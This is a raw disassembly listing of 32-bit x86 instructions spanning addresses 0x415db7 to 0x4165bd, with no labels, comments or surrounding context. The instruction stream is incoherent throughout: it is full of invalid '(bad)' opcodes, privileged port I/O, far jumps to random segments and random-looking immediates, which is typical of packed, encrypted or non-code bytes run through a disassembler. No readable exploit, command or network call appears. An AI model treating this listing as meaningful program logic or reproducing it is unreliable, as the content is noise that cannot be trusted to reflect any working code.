  415db7:	fld    TBYTE PTR [ebx+ebx*2-0x11]
  415dbb:	ja     0x415d5c
  415dbd:	aam    0x53
  415dbf:	dec    ebp
  415dc0:	dec    ecx
  415dc1:	fcmovb st,st(2)
  415dc3:	repz jp 0x415da5
  415dc6:	and    edi,esp
  415dc8:	outs   dx,BYTE PTR ds:[esi]
  415dc9:	mov    dh,0xdf
  415dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dcc:	cmp    eax,0xf7447
  415dd1:	fimul  DWORD PTR [ebx+0x5]
  415dd4:	cld    
  415dd5:	and    DWORD PTR [edi+ebp*8],esp
  415dd8:	sbb    BYTE PTR [edi+0x305fe686],cl
  415dde:	ja     0x415e23
  415de0:	scas   al,BYTE PTR es:[edi]
  415de1:	mov    al,ds:0x761002f0
  415de6:	gs xchg ebp,eax
  415de8:	mov    ebp,0xa12b91ba
  415ded:	ss pop eax
  415def:	pop    eax
  415df0:	pop    es
  415df1:	push   cs
  415df2:	push   ss
  415df3:	rcr    BYTE PTR [ecx-0x4641a838],1
  415df9:	xor    eax,0x6b487640
  415dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dff:	(bad)  
  415e00:	jbe    0x415d9e
  415e02:	leave  
  415e03:	cmp    esp,DWORD PTR [ebp-0x69]
  415e06:	ins    BYTE PTR es:[edi],dx
  415e07:	shr    al,cl
  415e09:	xor    BYTE PTR [esi+0x1],ch
  415e0c:	sti    
  415e0d:	fmul   DWORD PTR [eax+0x35dd0b99]
  415e13:	pop    eax
  415e14:	pop    edi
  415e15:	sbb    BYTE PTR [edx-0x50c35347],bh
  415e1b:	fmul   st(3),st
  415e1d:	sbb    bh,BYTE PTR [edi+0x20]
  415e20:	fucomi st,st(3)
  415e22:	std    
  415e23:	sub    BYTE PTR [esi+0x67df0515],al
  415e29:	jmp    0x5a551dbd
  415e2e:	fidivr WORD PTR [esi+0x5f08915f]
  415e34:	out    0x8f,eax
  415e36:	fisttp QWORD PTR cs:[ebx+0x7a]
  415e3a:	pop    ds
  415e3b:	fidiv  DWORD PTR [ecx-0x19]
  415e3e:	push   ebx
  415e3f:	and    eax,0x51d2c057
  415e44:	(bad)  
  415e46:	imul   ebx,ebx,0x75
  415e49:	mov    eax,0xa4e517a2
  415e4e:	cmp    DWORD PTR [edx-0x2207c6b3],ebx
  415e54:	enter  0xbd3e,0xf3
  415e58:	and    cl,BYTE PTR [edi-0x22]
  415e5b:	int    0xe4
  415e5d:	ret    0x4f06
  415e60:	sbb    DWORD PTR [edx+0x35292352],0x667e7f3d
  415e6a:	test   eax,0xf329c31a
  415e6f:	rol    DWORD PTR [ebp-0x6ea0b293],0x8d
  415e76:	mov    eax,0xb3da3b25
  415e7b:	mov    eax,ds:0x7e3b769a
  415e80:	repz mov dl,0xc0
  415e83:	adc    BYTE PTR [ecx],0x5
  415e86:	jl     0x415e16
  415e88:	je     0x415eed
  415e8a:	push   0x1339817f
  415e8f:	or     ecx,DWORD PTR [ebp-0x5b6390e3]
  415e95:	sub    DWORD PTR ss:[ecx-0x6702364b],esp
  415e9c:	dec    ecx
  415e9d:	sbb    edx,ebp
  415e9f:	lock push 0x342fee1e
  415ea5:	test   dh,0x26
  415ea8:	jae    0x415ef5
  415eaa:	(bad)  
  415eab:	(bad)  
  415eac:	and    al,0xe7
  415eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eaf:	jnp    0x415e86
  415eb1:	jno    0x415e4b
  415eb3:	dec    ebp
  415eb4:	hlt    
  415eb5:	and    al,0xdd
  415eb7:	fcmovnu st,st(1)
  415eb9:	mov    BYTE PTR [eax+0x3d],dh
  415ebc:	sbb    ch,BYTE PTR fs:[ebp-0x20bb014f]
  415ec3:	test   DWORD PTR [edx+0x5b652b0b],0x1343f70
  415ecd:	inc    edi
  415ece:	inc    edi
  415ecf:	leave  
  415ed0:	sbb    BYTE PTR [edi],dh
  415ed2:	cmp    eax,0xf7fb3ee8
  415ed7:	xchg   edx,eax
  415ed8:	xor    al,0xc0
  415eda:	jno    0x415ee2
  415edc:	mov    dl,0xe0
  415ede:	mov    edi,0xa80e7cbc
  415ee3:	pop    ebx
  415ee4:	sub    DWORD PTR [ebx],esi
  415ee6:	test   al,0x87
  415ee8:	gs pop ebx
  415eea:	or     al,0xec
  415eec:	(bad)  
  415eed:	les    edi,FWORD PTR [ecx-0x5d]
  415ef0:	inc    ecx
  415ef1:	or     eax,0xd2e6d286
  415ef6:	je     0x415ef5
  415ef8:	inc    esp
  415ef9:	and    dl,dh
  415efb:	out    dx,al
  415efc:	cmp    DWORD PTR [esi],esi
  415efe:	enter  0xa909,0x7c
  415f02:	ja     0x415f52
  415f04:	xabort 0x6b
  415f07:	pop    edi
  415f08:	retf   
  415f09:	fiadd  WORD PTR [edi]
  415f0b:	pop    ss
  415f0c:	push   eax
  415f0d:	jl     0x415ee9
  415f0f:	mov    ds:0x831157db,al
  415f14:	xchg   ebp,eax
  415f15:	mov    dh,0x32
  415f17:	mov    ecx,0x866ed070
  415f1c:	cmp    DWORD PTR [ebx],ebp
  415f1e:	sbb    edi,DWORD PTR [ebp+0x38]
  415f21:	pop    ecx
  415f22:	or     ecx,0x31
  415f25:	lea    ebp,[edi-0x38b7ffb6]
  415f2b:	in     eax,0xe3
  415f2d:	sahf   
  415f2e:	ficomp WORD PTR [eax+0x7d]
  415f31:	adc    al,0x97
  415f33:	inc    esp
  415f34:	test   eax,0x8d9589b8
  415f39:	iret   
  415f3a:	dec    ecx
  415f3b:	mov    ecx,0xefebc89c
  415f40:	stos   DWORD PTR es:[edi],eax
  415f41:	out    0x66,eax
  415f43:	je     0x415fa8
  415f45:	(bad)  
  415f46:	fcomp  DWORD PTR [esi-0x61e3fca7]
  415f4c:	and    BYTE PTR [ecx-0x92e7f40],dh
  415f52:	out    0x37,al
  415f54:	popf   
  415f55:	(bad)  
  415f56:	dec    cx
  415f58:	jo     0x415f02
  415f5a:	or     eax,0x540add5
  415f5f:	mov    ecx,0xe35751e
  415f64:	xchg   BYTE PTR [eax-0x5bfb9b91],dh
  415f6a:	pop    eax
  415f6b:	pop    esi
  415f6c:	je     0x415f6b
  415f6e:	jno    0x415fed
  415f70:	sbb    al,0x2d
  415f72:	mov    ds:0x6bb5cd8f,al
  415f77:	cs mov esi,es
  415f7a:	add    DWORD PTR [ebp+0x32306629],ecx
  415f80:	sahf   
  415f81:	lds    esp,FWORD PTR [esi]
  415f83:	mov    esi,0xb480de5c
  415f88:	mov    dl,0x4d
  415f8a:	sbb    DWORD PTR [ecx],edi
  415f8c:	sub    dl,cl
  415f8e:	xchg   ebp,eax
  415f8f:	les    esi,FWORD PTR [ecx+eax*2+0x44]
  415f93:	adc    edi,DWORD PTR [eax-0x1e]
  415f96:	pushf  
  415f97:	mov    eax,ds:0xd16683d6
  415f9c:	pop    ss
  415f9d:	out    0xa,al
  415f9f:	aaa    
  415fa0:	jne    0x415f7c
  415fa2:	and    DWORD PTR [eax+0x76],0xfffffffd
  415fa6:	aad    0xf1
  415fa8:	dec    edx
  415fa9:	xchg   esp,eax
  415faa:	mov    al,ds:0xbe04444f
  415faf:	popa   
  415fb0:	aam    0xe4
  415fb2:	shl    BYTE PTR [edx],1
  415fb4:	jae    0x415fa5
  415fb6:	fs std 
  415fb8:	mov    edi,0xd0c07301
  415fbd:	sahf   
  415fbe:	adc    al,0x1c
  415fc0:	cmp    ebx,ecx
  415fc2:	sub    al,0x5e
  415fc4:	xchg   ecx,eax
  415fc5:	das    
  415fc6:	arpl   si,cx
  415fc8:	jmp    0xb650:0x5df5de6
  415fcf:	jmp    0xb837e1ff
  415fd4:	fnstenv [eax]
  415fd6:	sub    eax,0xf14085fd
  415fdb:	xor    edx,DWORD PTR [ebp+0x3e]
  415fde:	fmul   DWORD PTR [ebp+0x15]
  415fe1:	imul   edx,DWORD PTR [eax+0x7a],0xd2d14f3d
  415fe8:	mov    bh,0xe6
  415fea:	adc    DWORD PTR [ecx-0x2d],edx
  415fed:	mov    esp,DWORD PTR [esi-0x35]
  415ff0:	pop    esi
  415ff1:	push   ds
  415ff2:	add    BYTE PTR [ecx+0x5f],bl
  415ff5:	loop   0x415ff5
  415ff7:	scas   eax,DWORD PTR es:[edi]
  415ff8:	mov    cl,BYTE PTR [ebp-0x8]
  415ffb:	out    0xd3,al
  415ffd:	xor    BYTE PTR [edi-0x59],bh
  416000:	inc    esp
  416001:	test   eax,0x1d875138
  416006:	gs xor al,0xd4
  416009:	mul    bh
  41600b:	cmovno ecx,DWORD PTR [ebp-0xf]
  41600f:	xor    esp,DWORD PTR [ebx+0x4e2287e3]
  416015:	out    0xbe,al
  416017:	xor    dh,ah
  416019:	js     0x41601a
  41601b:	faddp  st(6),st
  41601d:	test   DWORD PTR [edi-0xf],0x9c041abb
  416024:	sbb    al,0x76
  416026:	or     al,0x67
  416028:	jg     0x41605e
  41602a:	xchg   BYTE PTR [eax],dl
  41602c:	movsx  ebx,WORD PTR [eax-0x64e46f38]
  416033:	call   0xbf5c0095
  416038:	ret    0xb51e
  41603b:	sbb    eax,0xccc037b1
  416040:	call   0xf946:0x487a8bdd
  416047:	mov    dl,0x4b
  416049:	mov    ecx,0xa7f39cbe
  41604e:	inc    edx
  41604f:	adc    al,0x23
  416051:	out    dx,al
  416052:	xor    al,0xe8
  416054:	das    
  416055:	scas   eax,DWORD PTR es:[edi]
  416056:	cdq    
  416057:	sub    BYTE PTR [ebp-0x7451afc2],bh
  41605d:	mov    edx,0x207c7c42
  416062:	stos   DWORD PTR es:[edi],eax
  416063:	pop    ds
  416064:	mov    ebp,0x91ea12a3
  416069:	cli    
  41606a:	stos   DWORD PTR es:[edi],eax
  41606b:	jle    0x41608c
  41606d:	call   0xbbe01e14
  416072:	cs in  al,dx
  416074:	out    0x71,eax
  416076:	(bad)  
  416077:	push   0xad4f137b
  41607c:	stos   DWORD PTR es:[edi],eax
  41607d:	inc    edi
  41607e:	push   ebp
  41607f:	dec    esp
  416080:	xor    cl,BYTE PTR [ecx-0x14dff1b1]
  416086:	mov    edx,0x8e04c685
  41608b:	sub    al,0xef
  41608d:	add    BYTE PTR [eax],cl
  41608f:	push   es
  416090:	daa    
  416091:	push   ecx
  416092:	dec    esi
  416093:	dec    eax
  416094:	test   eax,0xe51442ba
  416099:	test   al,0x45
  41609b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41609c:	mov    WORD PTR cs:[esi+0x5e],gs
  4160a0:	aam    0xb1
  4160a2:	lods   eax,DWORD PTR ds:[esi]
  4160a3:	sbb    eax,0x570a5404
  4160a8:	jnp    0x416063
  4160aa:	push   ebp
  4160ab:	mov    ds:0x376b193e,al
  4160b0:	adc    DWORD PTR [ebx],edx
  4160b2:	out    dx,eax
  4160b3:	xchg   edx,eax
  4160b4:	mov    al,0x6b
  4160b6:	imul   ecx,DWORD PTR [esp+ebx*4],0x4d
  4160ba:	mov    ch,0x65
  4160bc:	xchg   esi,eax
  4160bd:	push   edi
  4160be:	xlat   BYTE PTR gs:[ebx]
  4160c0:	call   0x616a106e
  4160c5:	and    al,0xa
  4160c7:	loopne 0x4160df
  4160c9:	add    DWORD PTR ds:0x4b2ba393,esp
  4160cf:	stos   DWORD PTR es:[edi],eax
  4160d0:	xchg   ecx,ecx
  4160d2:	aas    
  4160d3:	nop
  4160d4:	mov    es,ecx
  4160d6:	mov    cs,WORD PTR [edx-0x4f32b912]
  4160dc:	sbb    ebp,esp
  4160de:	fisubr WORD PTR [ecx*2-0x793137f7]
  4160e5:	js     0x416096
  4160e7:	arpl   WORD PTR [esi+0x58607584],bx
  4160ed:	cmp    ebp,DWORD PTR [edi+eiz*8-0x5f]
  4160f1:	xchg   ecx,eax
  4160f2:	add    edx,DWORD PTR [ebx+eiz*2-0x43863997]
  4160f9:	or     dl,BYTE PTR [edi+0x34]
  4160fc:	aam    0x7b
  4160fe:	pushf  
  4160ff:	sar    DWORD PTR [ecx-0x12],0xf4
  416103:	hlt    
  416104:	push   ds
  416105:	fsub   DWORD PTR ds:0x578b384b
  41610b:	add    ebp,ebx
  41610d:	stos   BYTE PTR es:[edi],al
  41610e:	sub    DWORD PTR [ebp-0x72],0xffffffce
  416112:	mov    bl,0x36
  416114:	mov    ebp,0xa83da485
  416119:	mov    al,0x20
  41611b:	push   0x42
  41611d:	add    ecx,ebp
  41611f:	imul   eax,DWORD PTR [edi],0xffffffa5
  416122:	inc    edx
  416123:	cmp    BYTE PTR [ebx+0x2f],ah
  416126:	lahf   
  416127:	aad    0x1f
  416129:	sub    edx,DWORD PTR [ebx]
  41612b:	stos   BYTE PTR es:[edi],al
  41612c:	sbb    eax,0x71399b2b
  416131:	cmp    ebp,edi
  416133:	adc    cl,BYTE PTR [esi+0x4d]
  416136:	std    
  416137:	js     0x416114
  416139:	int    0xa1
  41613b:	sub    cl,dl
  41613d:	add    eax,0x614867bc
  416142:	repz test dl,dh
  416145:	scas   al,BYTE PTR es:[edi]
  416146:	retf   
  416147:	jmp    0x4160f0
  416149:	les    esi,FWORD PTR [esp+edx*4-0x2c]
  41614d:	inc    edi
  41614e:	mov    al,0xa7
  416150:	mov    eax,DWORD PTR [ebp-0x7b]
  416153:	pop    ds
  416154:	push   ss
  416155:	dec    esp
  416156:	out    dx,al
  416157:	dec    ebp
  416158:	or     BYTE PTR [ebp+0x20],cl
  41615b:	ret    0xb9b6
  41615e:	inc    edx
  41615f:	inc    ebp
  416160:	neg    BYTE PTR [edi]
  416162:	scas   al,BYTE PTR es:[edi]
  416163:	ret    0xe062
  416166:	(bad)  
  416167:	stc    
  416168:	dec    edi
  416169:	lds    edi,FWORD PTR [eax]
  41616b:	or     ah,BYTE PTR [bx+si-0x791d]
  416170:	dec    esi
  416171:	pop    edi
  416172:	mov    WORD PTR [ebx+0x59],cs
  416175:	call   0x2941:0x76f1e6fa
  41617c:	pushf  
  41617d:	ins    DWORD PTR es:[edi],dx
  41617e:	xlat   BYTE PTR ds:[ebx]
  41617f:	lahf   
  416180:	pop    ss
  416181:	sysexit 
  416183:	retf   0xaa17
  416186:	lds    eax,FWORD PTR [eax+esi*1-0x1f]
  41618a:	fs ss out dx,al
  41618d:	pusha  
  41618e:	loopne 0x4161d7
  416190:	(bad)
  416193:	and    eax,0xaaf6b4cf
  416198:	sar    DWORD PTR [ebx-0x6c],cl
  41619b:	xchg   ebp,eax
  41619c:	xchg   BYTE PTR [eax-0x28bccc26],bl
  4161a2:	mov    ch,0x99
  4161a4:	jl     0x416211
  4161a6:	(bad)  
  4161a8:	or     eax,0x5be40091
  4161ad:	fnstsw WORD PTR [edx+0x67445e97]
  4161b3:	test   eax,0xa1c6ab6e
  4161b8:	pop    eax
  4161b9:	ins    DWORD PTR es:[edi],dx
  4161ba:	retf   
  4161bb:	fs sbb dh,dl
  4161be:	dec    ecx
  4161bf:	in     eax,dx
  4161c0:	in     al,dx
  4161c1:	sub    dh,cl
  4161c3:	out    0x4,eax
  4161c5:	sti    
  4161c6:	pop    ss
  4161c7:	adc    dl,BYTE PTR [ecx]
  4161c9:	mov    dl,0x20
  4161cb:	pop    edx
  4161cc:	mov    esp,0x10114624
  4161d1:	ja     0x416182
  4161d3:	in     al,0x45
  4161d5:	fs jmp 0xbb1bd94d
  4161db:	jb     0x416222
  4161dd:	jmp    0x4161f1
  4161df:	sar    BYTE PTR [esi-0xd],0x8f
  4161e3:	retf   
  4161e4:	xor    eax,0x2ec580e7
  4161e9:	cmp    al,0xd8
  4161eb:	adc    al,0x97
  4161ed:	pop    ecx
  4161ee:	lock mov al,ds:0x2054cfa1
  4161f4:	jp     0x4161c0
  4161f6:	or     DWORD PTR ds:0x599ed1,ebx
  4161fc:	mov    ah,0x1c
  4161fe:	arpl   WORD PTR [eax+0x6d],dx
  416201:	fimul  WORD PTR [esi-0x76eedd18]
  416207:	aaa    
  416208:	shl    BYTE PTR [ebx+0x73],1
  41620b:	hlt    
  41620c:	adc    eax,0xa5dfec74
  416211:	aaa    
  416212:	nop
  416213:	xor    esi,eax
  416215:	enter  0x2b81,0x11
  416219:	int    0x63
  41621b:	adc    edi,esi
  41621d:	mov    ah,0xc7
  41621f:	fwait
  416220:	pop    ss
  416221:	ror    DWORD PTR [edx],1
  416223:	push   ss
  416224:	das    
  416225:	loope  0x416261
  416227:	sti    
  416228:	imul   ebx,DWORD PTR [ebx+0x5e],0x738c6c98
  41622f:	mov    al,ds:0x2e0ed157
  416234:	mov    ebp,0xe404f947
  416239:	add    esi,ecx
  41623b:	dec    eax
  41623c:	inc    ecx
  41623d:	mov    ah,0xd
  41623f:	cmp    cl,BYTE PTR ds:0xfe613623
  416245:	xor    ch,BYTE PTR [esi+0x12b6869d]
  41624b:	addr16 jno 0x4162aa
  41624e:	call   0x9ba9:0x3ac6e191
  416255:	sbb    al,0xe5
  416257:	jg     0x416240
  416259:	mov    BYTE PTR es:[ebx-0x79],0x76
  41625e:	dec    ecx
  41625f:	cmp    DWORD PTR [esi-0x30],ebp
  416262:	and    DWORD PTR [esi+eiz*2],esi
  416265:	inc    ebp
  416266:	mov    BYTE PTR [esp+ebp*4-0x6b],bl
  41626a:	js     0x41620f
  41626c:	mov    bl,0xa8
  41626e:	mov    cl,0xdd
  416270:	sbb    eax,0x9097dee6
  416275:	clc    
  416276:	shl    BYTE PTR [edi],1
  416278:	inc    eax
  416279:	add    al,bh
  41627b:	into   
  41627c:	push   edi
  41627d:	xor    dl,BYTE PTR [ebx]
  41627f:	cmp    BYTE PTR [ebp+0xe46836c],0x7b
  416286:	xchg   esp,eax
  416287:	int3   
  416288:	ror    BYTE PTR [ecx],cl
  41628a:	mov    cl,0xad
  41628c:	cmp    eax,0x557ce78d
  416291:	xor    BYTE PTR [esi+ebx*8+0x27601009],ah
  416298:	or     bl,al
  41629a:	adc    esp,DWORD PTR [ebx-0x3e]
  41629d:	mov    al,ds:0x402de9cd
  4162a2:	xchg   si,ax
  4162a4:	das    
  4162a5:	fsubr  DWORD PTR [ebx-0x1f0c0ecc]
  4162ab:	cmp    BYTE PTR [eax],ch
  4162ad:	aam    0x3a
  4162af:	sbb    eax,0x1e5b47c8
  4162b4:	dec    esi
  4162b5:	and    BYTE PTR [esi-0x59],ah
  4162b8:	cmp    dl,BYTE PTR [esi-0x35427cbc]
  4162be:	pop    edi
  4162bf:	ins    BYTE PTR es:[edi],dx
  4162c0:	mov    ebx,0x414e929b
  4162c5:	cmp    ebx,DWORD PTR [ebx+0x33ab3697]
  4162cb:	sub    bh,BYTE PTR [edi+eax*8]
  4162ce:	xor    esi,DWORD PTR [eax+ecx*2-0x13]
  4162d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d5:	leave  
  4162d6:	mov    al,ds:0x27dd6a4e
  4162db:	(bad)  
  4162dd:	xor    DWORD PTR [ebp+0x7d0070b7],ebx
  4162e3:	ret    
  4162e4:	mov    ah,0x8f
  4162e6:	cmp    al,0x21
  4162e8:	ja     0x416300
  4162ea:	inc    esp
  4162eb:	cmc    
  4162ec:	out    dx,al
  4162ed:	dec    dh
  4162ef:	loope  0x416315
  4162f1:	pop    es
  4162f2:	jb     0x41630e
  4162f4:	inc    edi
  4162f5:	push   esp
  4162f6:	adc    eax,DWORD PTR [ecx+0x4f]
  4162f9:	loopne 0x41632f
  4162fb:	jl     0x41630c
  4162fd:	ins    DWORD PTR es:[edi],dx
  4162fe:	mov    ecx,0xef355bcc
  416303:	jecxz  0x416293
  416305:	jle    0x416385
  416307:	inc    edx
  416308:	lds    eax,FWORD PTR [ebx]
  41630a:	pop    ecx
  41630b:	iret   
  41630c:	inc    eax
  41630d:	xor    ebp,DWORD PTR [ecx+0x62c72805]
  416313:	stos   BYTE PTR es:[edi],al
  416314:	ja     0x4162fe
  416316:	aas    
  416317:	loope  0x416393
  416319:	cs leave 
  41631b:	nop
  41631c:	aas    
  41631d:	or     al,0xff
  41631f:	cmp    DWORD PTR [edx],eax
  416321:	or     BYTE PTR [ecx+0x2f],0xa0
  416325:	dec    esp
  416326:	cdq    
  416327:	call   0x5ec8234f
  41632c:	inc    edi
  41632d:	cmp    bh,bl
  41632f:	popa   
  416330:	ins    DWORD PTR es:[edi],dx
  416331:	(bad)  
  416332:	sti    
  416333:	popf   
  416334:	or     eax,DWORD PTR [ecx-0xf]
  416337:	jo     0x416336
  416339:	cmp    DWORD PTR [ebx],esi
  41633b:	scas   eax,DWORD PTR es:[edi]
  41633c:	sub    BYTE PTR [eax-0x23c3b2b5],cl
  416342:	sbb    DWORD PTR ds:0x92d0d491,ecx
  416348:	xor    al,0xcd
  41634a:	pop    edx
  41634b:	push   ds
  41634c:	jmp    0xc42f:0xd19e0f54
  416353:	pop    edx
  416354:	inc    edx
  416355:	add    edi,DWORD PTR [ecx+0x3b]
  416358:	push   ecx
  416359:	(bad)  
  41635a:	inc    edx
  41635b:	inc    BYTE PTR [eax+0x741a864f]
  416361:	jns    0x416303
  416363:	and    ecx,DWORD PTR [edi+0x5b883089]
  416369:	inc    edi
  41636a:	jmp    0x2c89:0xf31f97
  416371:	rcl    BYTE PTR [edi-0x27],1
  416374:	cwde   
  416375:	ret    0x9fc
  416378:	popa   
  416379:	lods   al,BYTE PTR ds:[esi]
  41637a:	xor    al,cl
  41637c:	jle    0x41638d
  41637e:	xor    DWORD PTR [eax],edi
  416380:	sub    eax,0xfb138cea
  416385:	mov    cl,0xed
  416387:	std    
  416388:	push   es
  416389:	lock or DWORD PTR [eax-0x7f],0xffffff86
  41638e:	or     edx,DWORD PTR ds:0x5ce2224c
  416394:	jl     0x416354
  416396:	xchg   esp,eax
  416397:	xchg   DWORD PTR [ecx+edx*8+0x1b],ebp
  41639b:	dec    ebx
  41639c:	out    dx,al
  41639d:	xchg   esp,eax
  41639e:	push   ss
  41639f:	and    BYTE PTR [edx+0x60db46a4],dl
  4163a5:	arpl   WORD PTR [esi],sp
  4163a7:	fmul   st,st(4)
  4163a9:	jl     0x41641c
  4163ab:	xchg   esp,eax
  4163ac:	mov    DWORD PTR [edx+0x7a],ebp
  4163af:	test   BYTE PTR ds:0x4508e501,ah
  4163b5:	repnz mov WORD PTR [ebx],gs
  4163b8:	adc    edx,esi
  4163ba:	(bad)  
  4163bb:	adc    eax,0xa27f4398
  4163c0:	sub    ch,al
  4163c2:	xor    al,0xf5
  4163c4:	pusha  
  4163c5:	mov    ecx,0x4e1d5bb0
  4163ca:	sub    DWORD PTR [ecx-0x4172540c],edx
  4163d0:	clc    
  4163d1:	icebp  
  4163d2:	lods   al,BYTE PTR ds:[esi]
  4163d3:	in     eax,dx
  4163d4:	ss mov eax,0xae19886a
  4163da:	jmp    0x6938:0x7c6624ac
  4163e1:	mov    BYTE PTR [esi+0x5b],al
  4163e4:	xchg   DWORD PTR [edx+ebx*1+0x34],esi
  4163e8:	retf   0x8460
  4163eb:	data16 sub dh,bh
  4163ee:	sbb    eax,0x38c47f40
  4163f3:	mov    ebp,0x26a0f520
  4163f8:	sub    ebx,ebx
  4163fa:	mov    bh,0xe0
  4163fc:	stos   BYTE PTR es:[edi],al
  4163fd:	(bad)  
  4163fe:	cmc    
  4163ff:	or     cl,BYTE PTR [edx-0x67]
  416402:	sbb    DWORD PTR [esi-0x6b],edi
  416405:	test   DWORD PTR [edi+0x3c],eax
  416408:	jmp    0x86f9:0x2defac12
  41640f:	bound  esp,QWORD PTR [ecx+0x226da865]
  416415:	xor    eax,0x9d33128
  41641a:	pop    ebx
  41641b:	mov    edi,edx
  41641d:	mov    al,ds:0x32c4de86
  416422:	mov    DWORD PTR [edx],eax
  416424:	pusha  
  416425:	cmp    dl,BYTE PTR [ebp+eax*2-0x56213f34]
  41642c:	pushf  
  41642d:	sub    ah,ah
  41642f:	adc    ebx,DWORD PTR [eax]
  416431:	mov    ch,0xb9
  416433:	add    eax,0xd8a9b936
  416438:	out    0x63,eax
  41643a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41643b:	xchg   ecx,eax
  41643c:	pop    ds
  41643d:	jbe    0x416477
  41643f:	out    dx,eax
  416440:	shl    DWORD PTR [eax],1
  416442:	mov    BYTE PTR [esi+0x70],bh
  416445:	cdq    
  416446:	(bad)  
  416447:	stc    
  416448:	ret    
  416449:	(bad)  
  41644a:	in     eax,dx
  41644b:	mov    ebx,0xdd86a41e
  416450:	pusha  
  416451:	mov    esp,0x11dcfffe
  416456:	mov    WORD PTR [eax-0x16],gs
  416459:	jmp    0x5072a24
  41645e:	ret    0x776a
  416461:	jnp    0x4164d9
  416463:	dec    edi
  416464:	xchg   edi,eax
  416465:	push   cs
  416466:	jbe    0x4164b4
  416468:	push   ds
  416469:	aam    0x60
  41646b:	inc    ebp
  41646c:	lea    esi,[edi+edi*8-0x7609fa12]
  416473:	cs xchg ebx,eax
  416475:	xchg   BYTE PTR [edx-0x53],dl
  416478:	mov    al,ds:0x8a46c2d4
  41647d:	xor    ebx,DWORD PTR [edx-0x45972c2d]
  416483:	sub    dl,BYTE PTR [eax-0x6d]
  416486:	adc    al,cl
  416488:	shl    BYTE PTR [ebp-0x1b01eaf9],1
  41648e:	loopne 0x416438
  416490:	repnz icebp 
  416492:	stos   DWORD PTR es:[edi],eax
  416493:	imul   ebp,DWORD PTR [ecx],0xa
  416496:	mov    es,ebx
  416498:	xor    al,0xdf
  41649a:	fist   WORD PTR [edi+0x44e6827a]
  4164a0:	jecxz  0x4164b2
  4164a2:	mov    dl,0x76
  4164a4:	pop    esi
  4164a5:	aas    
  4164a6:	sahf   
  4164a7:	nop
  4164a8:	mov    ds:0x2611b2cd,al
  4164ad:	inc    edi
  4164ae:	push   ss
  4164af:	test   BYTE PTR [ecx+ebx*2+0x1b],bl
  4164b3:	fdecstp 
  4164b5:	push   edi
  4164b6:	inc    edx
  4164b7:	xchg   edx,eax
  4164b8:	(bad)  
  4164b9:	popf   
  4164ba:	es pop ebp
  4164bc:	inc    edi
  4164bd:	sbb    DWORD PTR [edi],0x3e
  4164c0:	sbb    BYTE PTR [esp+eiz*2+0x7e02752f],cl
  4164c7:	imul   ecx,DWORD PTR [ebx+0x2f],0xaa56c5dc
  4164ce:	and    ebp,DWORD PTR [edx+edi*1-0x74]
  4164d2:	pusha  
  4164d3:	(bad)  
  4164d4:	je     0x416542
  4164d6:	cmp    al,0xe1
  4164d8:	xorps  xmm6,xmm3
  4164db:	enter  0x21b,0x69
  4164df:	jo     0x416540
  4164e1:	inc    edx
  4164e2:	jb     0x41650d
  4164e4:	imul   eax,DWORD PTR [ecx],0x8f443935
  4164ea:	dec    ebx
  4164eb:	cwde   
  4164ec:	fld    TBYTE PTR [esi-0x6e]
  4164ef:	mov    dl,0x1d
  4164f1:	loop   0x4164a0
  4164f3:	shl    BYTE PTR [ebx],1
  4164f5:	pop    edi
  4164f6:	jl     0x416563
  4164f8:	mov    cl,0xbd
  4164fa:	xor    al,0xbe
  4164fc:	push   0x886438af
  416501:	popa   
  416502:	cmp    DWORD PTR [esi],eax
  416504:	sub    ecx,DWORD PTR [ebp+0x67]
  416507:	outs   dx,DWORD PTR ds:[esi]
  416508:	or     eax,0x8cc0774b
  41650d:	mov    edi,0xcb6ef322
  416512:	dec    edx
  416513:	push   esi
  416514:	jl     0x41656e
  416516:	pop    edi
  416517:	inc    eax
  416518:	scas   al,BYTE PTR es:[edi]
  416519:	jae    0x4164e3
  41651b:	jmp    0x416547
  41651d:	jp     0x4164a4
  41651f:	fisub  WORD PTR [esi-0x74]
  416522:	pusha  
  416523:	inc    esp
  416524:	sub    al,0x55
  416526:	add    DWORD PTR [eax+0xb246785],0x5449517c
  416530:	sti    
  416531:	xchg   edi,eax
  416532:	sti    
  416533:	scas   al,BYTE PTR es:[edi]
  416534:	pop    esi
  416535:	sar    BYTE PTR [ecx-0x1d],0xa5
  416539:	icebp  
  41653a:	mov    ebx,0x77dac218
  41653f:	mov    ds,WORD PTR [bx-0x41]
  416543:	xor    al,0xe4
  416546:	add    dl,BYTE PTR [esi+ecx*1+0x70315351]
  41654d:	mov    esp,0x1dd00524
  416552:	sub    DWORD PTR [ebx-0x453ffbd9],eax
  416558:	lods   eax,DWORD PTR ds:[esi]
  416559:	icebp  
  41655a:	leave  
  41655b:	mov    ds:0xdba12992,eax
  416560:	sub    esi,DWORD PTR [ecx+0x4891d32a]
  416566:	mov    DWORD PTR [esi+0x21],ebx
  416569:	add    DWORD PTR [ecx+0x8],esp
  41656c:	lds    ebp,FWORD PTR [ebx-0xe]
  41656f:	add    edx,DWORD PTR [ebx-0xd]
  416572:	mov    cl,0x25
  416574:	push   ss
  416575:	dec    eax
  416576:	xor    eax,0xc423a9a8
  41657b:	xor    al,BYTE PTR [ebp-0x16]
  41657e:	sbb    ecx,DWORD PTR [ecx+0x2]
  416581:	sete   dh
  416584:	pop    edx
  416585:	dec    ebp
  416586:	in     eax,0x5
  416588:	jle    0x4165cb
  41658a:	jnp    0x416548
  41658c:	or     edx,DWORD PTR [edx+eax*1]
  41658f:	data16 xor BYTE PTR [esi+0x4cfd2fc4],dl
  416596:	mov    ds:0x97a34cd3,al
  41659b:	in     eax,dx
  41659c:	mov    edx,0xb5a9acb1
  4165a1:	stos   DWORD PTR es:[edi],eax
  4165a2:	lock sbb DWORD PTR [ecx+0xf],esp
  4165a6:	icebp  
  4165a7:	add    BYTE PTR ds:0xdfc12105,ah
  4165ad:	pop    eax
  4165ae:	push   es
  4165af:	push   es
  4165b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b1:	(bad)  
  4165b2:	call   0x505e60ff
  4165b7:	pusha  
  4165b8:	mov    edi,0xa99872f4
  4165bd:	mov    esi,0x565c5915
